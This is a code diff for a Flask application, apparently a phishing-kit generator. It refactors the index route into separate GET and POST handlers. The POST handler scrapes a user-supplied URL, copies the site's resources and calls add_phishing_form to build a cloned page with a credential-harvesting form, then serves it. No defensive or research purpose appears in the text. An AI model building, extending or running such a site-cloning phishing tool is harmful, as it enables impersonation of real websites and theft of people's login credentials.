@@ -75,21 +75,22 @@ def add_phishing_form(soup, target_dir, site_id):
     with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
         file.write(soup.prettify())
 
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    if request.method == 'POST':
-        url = request.form['url']
-        site_id = len(os.listdir(os.path.join(BASE_DIR, 'generated_sites')))
-        target_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
-        data_dir = os.path.join(target_dir, 'data')
-        if not os.path.exists(data_dir):
-            os.makedirs(data_dir)
-        soup = scrape_website(url)
-        copy_resources(soup, url, target_dir)
-        add_phishing_form(soup, target_dir, site_id)
-        return redirect(url_for('view_generated_site', site_id=site_id))
-
+@app.route('/', methods = ['GET'])
+def index_get():
     return render_template('index.html')
+
+@app.route('/', methods = ['POST'])
+def index_post():
+    url = request.form['url']
+    site_id = len(os.listdir(os.path.join(BASE_DIR, 'generated_sites')))
+    target_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
+    data_dir = os.path.join(target_dir, 'data')
+    if not os.path.exists(data_dir):
+        os.makedirs(data_dir)
+    soup = scrape_website(url)
+    copy_resources(soup, url, target_dir)
+    add_phishing_form(soup, target_dir, site_id)
+    return redirect(url_for('view_generated_site', site_id=site_id))
 
 @app.route('/site/<int:site_id>')
 def view_generated_site(site_id):
